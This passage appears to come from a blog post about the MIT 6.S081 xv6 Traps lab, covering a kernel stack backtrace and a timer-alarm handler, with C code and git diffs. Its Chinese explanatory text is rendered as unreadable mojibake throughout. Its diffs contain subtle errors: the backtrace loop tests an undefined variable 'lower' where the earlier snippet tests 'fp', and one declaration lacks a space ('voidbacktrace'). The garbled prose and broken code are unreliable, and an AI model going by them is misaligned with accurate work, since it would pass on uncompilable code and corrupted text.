src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/noterm.png"></p><p>ä½†æ‰“å°å‡ºæ¥çš„å‡½æ•°è°ƒç”¨çš„è¿”å›åœ°å€ä¼¼ä¹å¹¶æ²¡æœ‰ä»€ä¹ˆè§„å¾‹ï¼Œå› æ­¤æˆ‘åˆå°è¯•å°†éå†è¿‡ç¨‹ä¸­çš„æ ˆå¸§èµ·å§‹åœ°å€ <code>fp</code> æ‰“å°å‡ºæ¥ï¼Œå¾—åˆ°ä»¥ä¸‹ç»“æœï¼š</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/pfp.png"></p><p>ç»“åˆæç¤ºï¼š</p><blockquote><p>Xv6 allocates one page for each stack in the xv6 kernel at PAGE-aligned address.</p></blockquote><p>åŸå› å°±å¾ˆæ˜æ˜¾äº†ï¼Œåœ¨æ‰“å°ç¬¬ä¸‰ä¸ªè¿”å›åœ°å€æ—¶ï¼Œæ­¤æ—¶æ ˆå¸§èµ·å§‹åœ°å€ä¸º 0x3fffffa000ï¼Œæ³¨æ„è¯¥åœ°å€å 12 äºŒè¿›åˆ¶æ•°ä¸º 0ï¼Œä¸”é¡µé¢å¤§å°ä¸º 4KBï¼Œå› æ­¤è¯¥åœ°å€ä½äºä¸€ä¸ªé¡µé¢çš„èµ·å§‹åœ°å€ã€‚åˆå› ä¸º xv6 å†…æ ¸åªä¸ºæ¯ä¸ª <strong>å†…æ ¸æ ˆ</strong> åˆ†é…ä¸€ä¸ªé¡µé¢çš„å­˜å‚¨ç©ºé—´ï¼Œè¯¥é¡µé¢çš„èµ·å§‹åœ°å€æŒ‰é¡µé¢å¤§å°å¯¹é½ï¼Œæ‰€ä»¥æ­¤æ—¶å·²ç»åˆ°è¾¾ä¸€ä¸ªå†…æ ¸æ ˆçš„é¡¶ç«¯ï¼Œæ— éœ€ç»§ç»­éå†ã€‚</p><p>å¼„æ¸…æ¥šäº†è¿™äº›ï¼Œä»£ç çš„ç¼–å†™å°±å¾ˆç®€å•äº†ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">backtrace</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"backtrace:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64 fp <span class="token operator">=</span> <span class="token function">r_fp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64 top <span class="token operator">=</span> <span class="token function">PGROUNDUP</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>uint64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>fp <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fp <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>uint64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>fp <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>fp <span class="token operator">&lt;</span> top<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// reach the top of kernel stack</span><span class="token punctuation">&#125;</span></code></pre><h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-diff" data-language="diff"><code class="language-diff"><span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -80,6 +80,7 @@ int             pipewrite(struct pipe*, uint64, int);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void            printf(char*, ...);</span><span class="token prefix unchanged"> </span><span class="token line">void            panic(char*) __attribute__((noreturn));</span><span class="token prefix unchanged"> </span><span class="token line">void            printfinit(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">voidbacktrace(void); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// proc.c</span><span class="token prefix unchanged"> </span><span class="token line">int             cpuid(void);</span></span>diff --git a/kernel/printf.c b/kernel/printf.cindex e1347de..a068cbd 100644<span class="token coord">--- a/kernel/printf.c</span><span class="token coord">+++ b/kernel/printf.c</span>@@ -114,6 +114,23 @@ printf(char *fmt, ...)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    release(&amp;pr.lock);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">void backtrace(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">printf("backtrace:\n");</span><span class="token prefix inserted">+</span><span class="token line">uint64 fp = r_fp();</span><span class="token prefix inserted">+</span><span class="token line">uint64 top = PGROUNDUP(fp);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">do &#123;</span><span class="token prefix inserted">+</span><span class="token line">printf("%p\n", *(uint64 *)(fp - 8));</span><span class="token prefix inserted">+</span><span class="token line">fp = *(uint64 *)(fp - 16);</span><span class="token prefix inserted">+</span><span class="token line">&#125; while (lower &lt; top);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void</span><span class="token prefix unchanged"> </span><span class="token line">panic(char *s)</span><span class="token prefix unchanged"> </span><span class="token line">&#123;</span></span>diff --git a/kernel/riscv.h b/kernel/riscv.hindex 1691faf..fae7bf3 100644<span class="token coord">--- a/kernel/riscv.h</span><span class="token coord">+++ b/kernel/riscv.h</span>@@ -331,6 +331,15 @@ sfence_vma()<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  asm volatile("sfence.vma zero, zero");</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">static inline uint64</span><span class="token prefix inserted">+</span><span class="token line">r_fp()</span><span class="token prefix inserted">+</span><span class="token line">&#123;</span><span class="token prefix inserted">+</span><span class="token line">  uint64 x;</span><span class="token prefix inserted">+</span><span class="token line">  asm volatile("mv %0, s0" : "=r" (x) );</span><span class="token prefix inserted">+</span><span class="token line">  return x;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#define PGSIZE 4096 // bytes per page</span><span class="token prefix unchanged"> </span><span class="token line">#define PGSHIFT 12  // bits of offset within a page</span></span>diff --git a/kernel/sysproc.c b/kernel/sysproc.cindex e8bcda9..f27c007 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span>@@ -70,6 +70,7 @@ sys_sleep(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    sleep(&amp;ticks, &amp;tickslock);</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;tickslock);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  backtrace(); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  return 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span></code></pre><h1 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h1><h2 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ç›®å‰ä¸ºæ­¢æ„Ÿè§‰æœ€å¤æ‚çš„ä¸€é¢˜ï¼Œéœ€è¦å¯¹ trap æœºåˆ¶æœ‰ä¸€ä¸ªæ¯”è¾ƒæ·±å…¥çš„ç†è§£ï¼Œå»ºè®®åœ¨ä¸Šæ‰‹ä¹‹å‰å…ˆä»”ç»†é˜…è¯»ä¸ trap æœ‰å…³çš„ä»£ç ï¼š<code>kernel/trampoline.S</code> å’Œ <code>kernel/trap.c</code>ï¼Œè¿™é‡Œä¹Ÿæ¨èä¸€ä½åšä¸»å†™çš„ä¸¤ç¯‡æœ‰å…³ xv6 çš„ trap æœºåˆ¶çš„åšå®¢ï¼š</p><p><a href="https://blog.csdn.net/zzy980511/article/details/130255251">6.S081â€”â€”é™·é˜±éƒ¨åˆ†(ä¸€æ–‡è¯»æ‡‚xv6ç³»ç»Ÿè°ƒç”¨)â€”â€”xv6æºç å®Œå…¨è§£æç³»åˆ—(5)</a></p><p><a href="https://blog.csdn.net/zzy980511/article/details/130642258">6.S081â€”â€”è¡¥å……ææ–™â€”â€”RISC-Væ¶æ„ä¸­çš„å¼‚å¸¸ä¸ä¸­æ–­è¯¦è§£</a></p><h3 id="test0-invoke-handler"><a href="#test0-invoke-handler" class="headerlink" title="test0: invoke handler"></a>test0: invoke handler</h3><p>æˆ‘ä»¬ä¸å¦¨æŒ‰ç…§æç¤ºçš„é¡ºåºæ¥è¿›è¡Œï¼Œä¸å…³æ³¨ <code>sys_sigreturn</code>ï¼Œå…ˆæŠŠ <code>sys_sigalarm</code> çš„åŠŸèƒ½å®ç°ã€‚</p><p>å®é™…ä¸Šï¼Œ<code>sys_sigalarm</code> å‡½æ•°çš„åŠŸèƒ½å¾ˆç®€å•ï¼Œåªæ˜¯ç®€å•åœ°å°†ç”¨æˆ·æ€ä¸‹ä¼ é€’çš„å‚æ•° <code>ticks</code> å’Œ <code>handler</code> å­˜å…¥è¿›ç¨‹çš„ <code>struct proc</code> ç»“æ„ä½“ä¸­ã€‚å®ç°è°ƒç”¨ <code>handler</code> çš„æ“ä½œéœ€è¦åœ¨å†…æ ¸æ€ä¸‹çš„ <code>usertrap</code> ä¸­å®Œæˆï¼Œå…·ä½“æ¥è¯´ï¼Œé’ˆå¯¹æ—¶é’Ÿä¸­æ–­å¯¼è‡´çš„ trap å°†åœ¨ <code>if(which_dev == 2)</code> åçš„è¯­å¥ä¸­è¢«å¤„ç†ã€‚æœ‰ä¸¤ä¸ªç›®æ ‡éœ€è¦å®Œæˆï¼š <strong>å®šæ—¶</strong> å’Œ <strong>å‡½æ•°è°ƒç”¨</strong> ã€‚</p><p>å®šæ—¶çš„é€»è¾‘æ¯”è¾ƒæ¸…æ¥šï¼Œåœ¨ <code>struct proc</code> ä¸­æ·»åŠ å˜é‡ <code>ticksum</code>ï¼Œä»£è¡¨ä»ä¸Šæ¬¡ <code>handler</code> å¤„ç†å®Œæˆå¼€å§‹è¿›ç¨‹ç´¯è®¡çš„æ—¶é’Ÿä¸­æ–­æ¬¡æ•°ï¼Œè¯¥å˜é‡åœ¨è¿›ç¨‹åˆå§‹åŒ–æ—¶è®¾ç½®ä¸º 0ï¼Œéšåæ¯æ¬¡é‡åˆ°æ—¶é’Ÿä¸­æ–­ï¼Œéƒ½è‡ªå¢ 1ï¼Œå¦‚æœè‡ªå¢åçš„å€¼è¾¾åˆ°äº†è®¾å®šçš„é—´éš” <code>ticks</code>ï¼Œåˆ™å°†å…¶å¤ä½ä¸º 0ï¼Œè°ƒç”¨ <code>handler</code> å‡½æ•°ã€‚</p><p>å‡½æ•°è°ƒç”¨æ˜¯ä¸€ä¸ªéœ€è¦è€ƒè™‘çš„é—®é¢˜ï¼Œè¿™é‡Œä¸èƒ½ç›´æ¥åˆ©ç”¨å‡½æ•°æŒ‡é’ˆ <code>handler</code> è¿›è¡Œå‡½æ•°è°ƒç”¨ï¼Œå› ä¸º <code>handler</code> æŒ‡å‘çš„å‡½æ•°ä½äºç”¨æˆ·ç©ºé—´ä¸‹ï¼Œè€Œ <code>usertrap</code> ä½äºå†…æ ¸æ€ä¸‹ï¼Œé¡µè¡¨çš„åœ°å€æ˜ å°„ä¸åŒï¼Œæ— æ³•ç›´æ¥æ ¹æ®ç”¨æˆ·ç©ºé—´ä¸‹çš„è™šæ‹Ÿåœ°å€è¿›è¡Œå¯»å€ï¼ˆç›´æ¥è°ƒç”¨å¼•å‘çš„é”™è¯¯å¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰ï¼Œéœ€è¦åœ¨æœ¬æ¬¡ä¸­æ–­ç»“æŸè¿”å›åˆ°ç”¨æˆ·æ€ä¹‹åæ‰§è¡Œã€‚å› æ­¤æ­£ç¡®çš„åšæ³•åº”è¯¥æ˜¯è®¾ç½®è¿›ç¨‹ <code>struct proc</code> çš„ <code>epc</code> å¯„å­˜å™¨ä¸ºå‡½æ•°æŒ‡é’ˆ <code>handler</code>ï¼Œè¿™æ ·åœ¨ä¸­æ–­å¤„ç†å®Œæˆï¼Œè¿›ç¨‹å›åˆ°ç”¨æˆ·æ€å¹¶è¢« CPU è°ƒåº¦æ‰§è¡Œåï¼Œå¯„å­˜å™¨ <code>pc</code> å°†è¢«è®¾ç½®é¢„å…ˆä¿å­˜çš„ <code>epc</code> çš„å€¼ï¼Œè¿™æ ·å‡½æ•° <code>handler</code> å°±è¢«æˆåŠŸè°ƒåº¦æ‰§è¡Œäº†ã€‚è‡³æ­¤ï¼Œtest0 åº”è¯¥æˆåŠŸé€šè¿‡ã€‚</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/nil.png"></p><p>åœ¨è¿›å…¥åˆ° test1&amp;2 ä¹‹å‰ï¼Œæœ‰å¿…è¦è¯´ä¸€è¯´æˆ‘çš„ä¸€äº›æ€è€ƒï¼šåœ¨ä¸Šé¢çš„è®¨è®ºä¸­ï¼Œæˆ‘ä»¬çŸ¥é“å†…æ ¸æ— æ³•ç›´æ¥æ ¹æ®å‡½æ•°æŒ‡é’ˆ <code>handler</code> çš„å€¼è¿›è¡Œç”¨æˆ·ç©ºé—´å‡½æ•°çš„è°ƒç”¨ï¼Œé‚£èƒ½å¦åœ¨å†…æ ¸æ€ä¸‹æ ¹æ®è¿›ç¨‹çš„ç”¨æˆ·æ€é¡µè¡¨å’Œç»™å®šçš„è™šæ‹Ÿåœ°å€ï¼Œåˆ©ç”¨è½¯ä»¶åœ°å€è½¬æ¢æœºåˆ¶ï¼ˆ<code>vm.c</code> ä¸­çš„ <code>walkaddr</code> å‡½æ•°ï¼‰æ¥å°†ç”¨æˆ·ç©ºé—´çš„è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€è¿›è¡Œå¯»å€å‘¢ï¼ˆè¿™ä¹Ÿæ˜¯æˆ‘æœ€å¼€å§‹çš„æƒ³æ³•ï¼‰ï¼Ÿç­”æ¡ˆæ˜¯ä¸è¡Œï¼Œå› ä¸ºå³ä¾¿æ˜¯åœ¨å†…æ ¸æ€ä¸‹ï¼Œç¨‹åºä¸­çš„åœ°å€ä»ç„¶æ˜¯è™šæ‹Ÿåœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´å³ä¾¿çŸ¥é“ç”¨æˆ·æ€å‡½æ•°å®é™…å­˜å‚¨çš„ç‰©ç†åœ°å€ï¼Œæˆ‘ä»¬ä¹Ÿåªæœ‰åœ¨ <strong>ç»™å‡ºä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼Œè¯¥è™šæ‹Ÿåœ°å€ç»è¿‡å†…æ ¸é¡µè¡¨åœ°å€è½¬æ¢ä¹‹åï¼Œåˆšå¥½å¾—åˆ°äº†æ­£ç¡®çš„ç‰©ç†åœ°å€ï¼Œ</strong> æ‰å¯èƒ½æˆåŠŸã€‚è€Œå®é™…ä¸Šï¼Œå°½ç®¡å†…æ ¸ <code>KERNBASE</code> åˆ° <code>PHYSTOP</code> åœ°å€éƒ½æ˜¯ç›´æ¥æ˜ å°„ï¼Œä½†å†…æ ¸é¡µè¡¨ä¸­å¯èƒ½å¹¶æ²¡æœ‰æ‰€éœ€è¦çš„é¡µè¡¨é¡¹ï¼Œå› æ­¤ï¼Œè¿™å¹¶ä¸ä¼šæˆåŠŸã€‚</p><h3 id="test1-test2-resume-interrupted-code"><a href="#test1-test2-resume-interrupted-code" class="headerlink" title="test1/test2(): resume interrupted code"></a>test1/test2(): resume interrupted code</h3><p>test1 çš„ç›®æ ‡æ˜¯ï¼Œå­˜å‚¨å’Œæ¢å¤ä¸­æ–­å¤„ç†å‰åçš„å¯„å­˜å™¨çŠ¶æ€ã€‚é‚£ä¹ˆé—®é¢˜å°±æ¥äº†ï¼šä¸ºä»€ä¹ˆéœ€è¦å­˜å‚¨è¿™äº›å¯„å­˜å™¨ï¼Ÿéœ€è¦å­˜å‚¨å“ªäº›å¯„å­˜å™¨ï¼Ÿ</p><p>å…¶å®æœ€å¼€å§‹ï¼Œæˆ‘æ˜¯æœ‰äº›çº ç»“å¯„å­˜å™¨çŠ¶æ€çš„å­˜å‚¨ç›®çš„æ˜¯ä»€ä¹ˆï¼Œè®¤ä¸ºå¯èƒ½æ˜¯ä¸å†…æ ¸æ€å’Œç”¨æˆ·æ€åˆ‡æ¢æœ‰å…³ï¼Œä½†ä»”ç»†æƒ³æƒ³ï¼Œè¿™éƒ¨åˆ†çš„å·¥ä½œåº”è¯¥æ˜¯ç”± <code>trampoline.S</code> å’Œ <code>usertrapret</code> æ¥å®Œæˆçš„ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¿˜éœ€è¦å­˜å‚¨å’Œæ¢å¤å¯„å­˜å™¨ï¼Ÿ</p><p>äº‹å®ä¸Šï¼Œåœ¨ç³»ç»Ÿæœªå…³é—­ä¸­æ–­çš„æƒ…å†µä¸‹ï¼Œæ—¶é’Ÿä¸­æ–­å¯èƒ½åœ¨ç¨‹åºæ‰§è¡Œçš„ä»»ä½•æ—¶åˆ»å‘ç”Ÿï¼Œä¸”åœ¨è¿”å›åˆ°åŸç¨‹åºä½ç½®ç»§ç»­æ‰§è¡Œä¹‹å‰è¿˜éœ€è¦æ‰§è¡Œé¢„å…ˆè®¾å®šå¥½çš„ <code>handler</code> å‡½æ•°ï¼Œé‚£ä¹ˆå¯„å­˜å™¨çŠ¶æ€çš„ä¿å­˜å°†æ˜¯å¿…è¦çš„ã€‚ä¸€æ–¹é¢åœ¨æ‰§è¡Œ <code>handler</code> å‡½æ•°æœŸé—´ï¼Œå¦‚æœ <code>handler</code> å‡½æ•°åŒ…å«ä¸€äº›å¯¹å±€éƒ¨å˜é‡çš„å¤„ç†ï¼Œé‚£ä¹ˆé€šç”¨å¯„å­˜å™¨çš„å€¼å°†ä¼šå‘ç”Ÿæ”¹å˜ï¼Œä»è€Œä½¿å¾—ä¸­æ–­è¿”å›æ—¶ç¨‹åºçš„æ‰§è¡Œç»“æœä¸é¢„æœŸä¸ç¬¦ï¼›å¦ä¸€æ–¹é¢ï¼Œç”±äº <code>epc</code> çš„å€¼è¢«æ‰‹åŠ¨æ”¹å˜ï¼Œå¦‚æœæ‰§è¡Œå®Œ <code>handler</code> ä¹‹åä¸æ¢å¤ä¸­æ–­å‘ç”Ÿæ—¶çš„ä¿å­˜çš„ <code>pc</code> å€¼ï¼Œé‚£ä¹ˆ <code>pc</code> å°†ä¼šæŒ‡å‘ <code>handler</code> å‡½æ•°æœ«å°¾çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œä¸­æ–­å› æ­¤æ— æ³•æ­£å¸¸è¿”å›ã€‚ ç®€å•æ¥è¯´ï¼Œè¿™éƒ¨åˆ†çš„æ“ä½œç›¸å½“äºæ‰‹åŠ¨æ¨¡æ‹Ÿäº† <strong>çº¿ç¨‹</strong> çš„åˆ‡æ¢ã€‚</p><p>å¦ä¸€ä¸ªé—®é¢˜æ˜¯ï¼šéœ€è¦å­˜å‚¨å“ªäº›å¯„å­˜å™¨ï¼Ÿå¥½å§ï¼Œåœ¨è§£å†³è¿™ä¸ª Lab æ—¶æˆ‘å…¶å®å·äº†ç‚¹æ‡’ï¼Œæ²¡æœ‰å»ä»”ç»†ç¢ç£¨ï¼Œåªæ˜¯ç®€å•åœ°å°†æ•´ä¸ª <code>trapframe</code> ä¸­æ‰€æœ‰çš„å¯„å­˜å™¨éƒ½ä¿å­˜ä¸‹æ¥ã€‚ä½†æ ¹æ®ä¸Šé¢çš„è®¨è®ºï¼Œå†ç»“åˆ RISC-V çš„ <em>calling convention</em>ï¼Œåº”è¯¥ä¸éš¾å¾—å‡ºç­”æ¡ˆã€‚</p><p>æœ€åçš„ test2 å°±æ¯”è¾ƒç®€å•äº†ï¼Œç›®æ ‡æ˜¯ï¼š</p><blockquote><p>Prevent re-entrant calls to the handlerâ€”-if a handler hasnâ€™t returned yet, the kernel shouldnâ€™t call it again.</p></blockquote><p>è§£å†³çš„åŠæ³•æœ‰å¾ˆå¤šï¼Œå¯ä»¥é¢å¤–åœ¨ <code>strcut proc</code> æ·»åŠ ä¸€ä¸ªå˜é‡ï¼Œç”¨æ¥è¡¨ç¤ºè¿›ç¨‹å½“å‰æ˜¯å¦æ­£å¤„åœ¨å¤„ç† <code>handler</code> çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™ä¸è¿›è¡Œ <code>ticksum</code> çš„è‡ªå¢æ“ä½œã€‚è¿™é‡Œæˆ‘é‡‡ç”¨äº†ä¸€ç‚¹ <strong>å°æŠ€å·§</strong> ï¼šä¸æ·»åŠ é¢å¤–çš„å˜é‡ï¼Œè€Œæ˜¯åœ¨å¤„ç† <code>handler</code> å‰å°† <code>ticksum</code> ç½®ä¸ºè´Ÿæ•°ï¼Œå¹¶åœ¨è‡ªå¢å‰åˆ¤æ–­ <code>ticksum</code> æ˜¯å¦éè´Ÿï¼Œåœ¨ <code>sys_sigreturn</code> æ—¶å†å°†å®ƒç½®ä¸º 0ï¼Œæœ¬è´¨ä¸Šä¸æ·»åŠ å˜é‡çš„æ“ä½œå¤§å·®ä¸å·®ã€‚</p><h2 id="ä»£ç -1"><a href="#ä»£ç -1" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefileindex 7a7e380..bc4d47a 100644<span class="token coord">--- a/Makefile</span><span class="token coord">+++ b/Makefile</span>@@ -188,6 +188,7 @@ UPROGS=\<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">$U/_grind\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_wc\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_zombie\</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">$U/_alarmtest\</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/proc.c b/kernel/proc.cindex 22e7ce4..80096f7 100644<span class="token coord">--- a/kernel/proc.c</span><span class="token coord">+++ b/kernel/proc.c</span>@@ -119,6 +119,7 @@ allocproc(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">found:</span><span class="token prefix unchanged"> </span><span class="token line">  p->pid = allocpid();</span><span class="token prefix unchanged"> </span><span class="token line">  p->state = USED;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  p->ticksum = 0; // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  // Allocate a trapframe page.</span><span class="token prefix unchanged"> </span><span class="token line">  if((p->trapframe = (struct trapframe *)kalloc()) == 0)&#123;</span></span>diff --git a/kernel/proc.h b/kernel/proc.hindex f6ca8b7..c1d5a23 100644<span class="token coord">--- a/kernel/proc.h</span><span class="token coord">+++ b/kernel/proc.h</span>@@ -105,4 +105,10 @@ struct proc &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  struct file *ofile[NOFILE];  // Open files</span><span class="token prefix unchanged"> </span><span class="token line">  struct inode *cwd;           // Current directory</span><span class="token prefix unchanged"> </span><span class="token line">  char name[16];               // Process name (debugging)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  int ticks;         // here</span><span class="token prefix inserted">+</span><span class="token line">  void (*handler)();</span><span class="token prefix inserted">+</span><span class="token line">  int ticksum;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  struct trapframe strapframe;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>diff --git a/kernel/syscall.c b/kernel/syscall.cindex c1b3670..d4e5585 100644<span class="token coord">--- a/kernel/syscall.c</span><span class="token coord">+++ b/kernel/syscall.c</span>@@ -104,6 +104,8 @@ extern uint64 sys_unlink(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_wait(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_sigalarm(void); // here</span><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_sigreturn(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,</span></span>@@ -127,6 +129,8 @@ static uint64 (*syscalls[])(void) = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_link]    sys_link,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_sigalarm]  sys_sigalarm,  // here</span><span class="token prefix inserted">+</span><span class="token line">[SYS_sigreturn] sys_sigreturn,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.hindex bc5f356..a040610 100644<span class="token coord">--- a/kernel/syscall.h</span><span class="token coord">+++ b/kernel/syscall.h</span><span class="token coord">@@ -20,3 +20,5 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_sigalarm  22  // here</span><span class="token prefix inserted">+</span><span class="token line">#define SYS_sigreturn 23</span></span>diff --git a/kernel/sysproc.c b/kernel/sysproc.cindex f27c007..ee859ed 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span>@@ -96,3 +96,28 @@ sys_uptime(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;tickslock);</span><span class="token prefix unchanged"> </span><span class="token line">  return xticks;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_sigalarm(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">struct proc *p = myproc();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">if (argint(0, &amp;(p->ticks)) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">if (argaddr(1, (uint64 *)&amp;(p->handler)) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_sigreturn(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">struct proc *p = myproc();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// restore registers</span><span class="token prefix inserted">+</span><span class="token line">memmove(p->trapframe, &amp;(p->strapframe), sizeof(p->strapframe));</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">p->ticksum = 0;</span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>diff --git a/kernel/trap.c b/kernel/trap.cindex a63249e..447e6d8 100644<span class="token coord">--- a/kernel/trap.c</span><span class="token coord">+++ b/kernel/trap.c</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -77,8 +77,17 @@ usertrap(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    exit(-1);</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> 